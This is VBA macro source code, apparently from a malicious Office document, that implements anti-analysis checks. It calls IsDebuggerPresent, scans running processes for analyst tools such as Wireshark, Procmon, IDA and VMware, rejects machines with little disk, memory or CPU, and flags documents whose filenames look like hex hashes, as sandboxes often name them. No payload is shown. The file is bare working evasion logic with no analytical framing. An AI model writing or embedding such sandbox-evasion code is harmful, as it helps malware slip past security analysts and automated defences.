Private Declare PtrSafe Function isDbgPresent Lib "kernel32" Alias "IsDebuggerPresent" () As Boolean

Public Function IsFileNameNotAsHexes() As Boolean
    Dim str As String
    Dim hexes As Variant
    Dim only_hexes As Boolean
    
    only_hexes = True
    hexes = Array("0", "1", "2", "3", "4", "5", "6", "7", _
                    "8", "9", "a", "b", "c", "d", "e", "f")
    str = ActiveDocument.name
    str = Mid(str, 1, InStrRev(str, ".") - 1)
    
    For i = 1 To UBound(hexes, 1) - 1
        Dim ch As String
        ch = LCase(Mid(str, i, 1))
        If Not (UBound(Filter(hexes, ch)) > -1) Then
            ' Character not in hexes array.
            only_hexes = False
            Exit For
        End If
    Next
    
    only_hexes = (Not only_hexes)
    IsFileNameNotAsHexes = only_hexes
End Function

Public Function IsProcessListReliable() As Boolean
    Dim objWMIService, objProcess, colProcess
    Dim strComputer, strList
    Dim bannedProcesses As Variant
    
    bannedProcesses = Array("fiddler", "vxstream", _
        "tcpview", "vmware", "procexp", "vmtools", "autoit", _
        "wireshark", "procmon", "idaq", "autoruns", "apatedns", _
        "windbg")
    
    strComputer = "."

    Set objWMIService = GetObject("winmgmts:" _
    & "{impersonationLevel=impersonate}!\\" _
    & strComputer & "\root\cimv2")
    
    Set colProcess = objWMIService.ExecQuery _
    ("Select * from Win32_Process")
    
    For Each objProcess In colProcess
        For Each proc In bannedProcesses
            If InStr(LCase(objProcess.name), LCase(proc)) <> 0 Then
                ' Found banned process.
                IsProcessListReliable = False
                Exit Function
            End If
        Next
    Next
    If isDbgPresent() Then
        IsProcessListReliable = False
        Exit Function
    End If
    IsProcessListReliable = (colProcess.Count() > 50)
End Function

Public Function IsHardwareReliable() As Boolean
    Dim objWMIService, objItem, colItems, strComputer
    Dim totalSize, totalMemory, cpusNum As Integer
    
    totalSize = 0
    totalMemory = 0
    cpusNum = 0
    
    Const wbemFlagReturnImmediately = &H10
    Const wbemFlagForwardOnly = &H20

    strComputer = "."
    
    ' Checking total HDD size
    Set objWMIService = GetObject _
    ("winmgmts:\\" & strComputer & "\root\cimv2")
    Set colItems = objWMIService.ExecQuery _
    ("Select * from Win32_LogicalDisk")
    
    For Each objItem In colItems
        Dim num
        num = Int(objItem.Size / 1073741824)
        If num > 0 Then
            totalSize = totalSize + num
        End If
    Next
    
    If totalSize < 60 Then
        ' Total HDD size of the machine must be at least 60GB
        IsHardwareReliable = False
        Exit Function
    End If
    
    ' Checking Memory
    Set colComputer = objWMIService.ExecQuery _
    ("Select * from Win32_ComputerSystem")
    
    For Each objComputer In colComputer
        totalMemory = totalMemory + Int((objComputer.TotalPhysicalMemory) / 1048576) + 1
    Next

    If totalMemory < 1024 Then
        ' Total Memory is less than 1GB
        IsHardwareReliable = False
        Exit Function
    End If
    
    Set colItems2 = objWMIService.ExecQuery("SELECT * FROM Win32_Processor", "WQL", _
        wbemFlagReturnImmediately + wbemFlagForwardOnly)
        
    For Each objItem In colItems2
        cpusNum = cpusNum + objItem.NumberOfLogicalProcessors
    Next
    
    If cpusNum < 2 Then
        ' Nowadays everyone has at least 2 logical cores.
        IsHardwareReliable = False
        Exit Function
    End If
    
    IsHardwareReliable = True
End Function

Public Function IsRunningInSandbox() As Boolean
    Dim test As Boolean
    If IsFileNameNotAsHexes() <> True Then
        IsRunningInSandbox = True
        Exit Function
    ElseIf IsProcessListReliable() <> True Then
        IsRunningInSandbox = True
        Exit Function
    ElseIf IsHardwareReliable() <> True Then
        IsRunningInSandbox = True
        Exit Function
    End If
    IsRunningInSandbox = False
End Function
